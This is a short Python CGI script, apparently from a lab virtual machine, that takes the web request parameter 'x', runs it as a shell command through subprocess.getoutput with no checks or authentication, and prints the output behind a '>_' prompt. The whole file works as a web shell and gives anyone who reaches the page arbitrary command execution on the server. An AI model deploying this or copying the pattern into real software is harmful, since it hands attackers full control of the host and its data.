#! /usr/bin/python3

import cgi
import subprocess
import time

print('Content-type: text/html')
print()

#print('python file from rhel vm')
#time.sleep(10)

f=cgi.FieldStorage()
cmd=f.getvalue('x')

o=subprocess.getoutput(cmd)
print('>_')
print(o)
